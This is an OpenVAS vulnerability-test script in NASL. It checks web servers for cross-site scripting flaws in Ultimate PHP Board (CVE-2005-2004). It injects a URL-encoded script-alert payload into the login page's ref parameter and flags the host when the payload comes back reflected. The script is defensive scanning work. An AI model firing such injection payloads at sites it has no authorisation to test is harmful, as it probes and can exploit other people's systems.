###############################################################################
# OpenVAS Vulnerability Test
# $Id: upb_xss.nasl 10862 2018-08-09 14:51:58Z cfischer $
#
# Ultimate PHP Board multiple XSS flaws
#
# Authors:
# Josh Zlatin-Amishav <josh at ramat dot cc>
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19498");
  script_version("$Revision: 10862 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-09 16:51:58 +0200 (Thu, 09 Aug 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-2004");
  script_bugtraq_id(13971);
  script_xref(name:"OSVDB", value:"17362");
  script_xref(name:"OSVDB", value:"17363");
  script_xref(name:"OSVDB", value:"17364");
  script_xref(name:"OSVDB", value:"17365");
  script_xref(name:"OSVDB", value:"17366");
  script_xref(name:"OSVDB", value:"17367");
  script_xref(name:"OSVDB", value:"17368");
  script_xref(name:"OSVDB", value:"17369");
  script_xref(name:"OSVDB", value:"17370");
  script_xref(name:"OSVDB", value:"17371");
  script_xref(name:"OSVDB", value:"17372");
  script_xref(name:"OSVDB", value:"17373");
  script_xref(name:"OSVDB", value:"17374");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_name("Ultimate PHP Board multiple XSS flaws");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.myupb.com/forum/viewtopic.php?id=26&t_id=118");
  script_xref(name:"URL", value:"http://securityfocus.com/archive/1/402461");

  script_tag(name:"solution", value:"Install vendor patch");
  script_tag(name:"summary", value:"The remote host is running Ultimate PHP Board (UPB).

  The remote version of this software is affected by several cross-site
  scripting vulnerabilities. These issues are due to a failure of the
  application to properly sanitize user-supplied input.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod", value:"50"); # No extra check, prone to false positives and doesn't match existing qod_types

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

# A simple alert.
xss = "'><script>alert(" + SCRIPT_NAME + ")</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode( str:xss );

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( dont_add_port:TRUE );
if( get_http_has_generic_xss( port:port, host:host ) ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string( dir, "/login.php?ref=", exss );

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  if( res =~ "^HTTP/1\.[01] 200" && xss >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );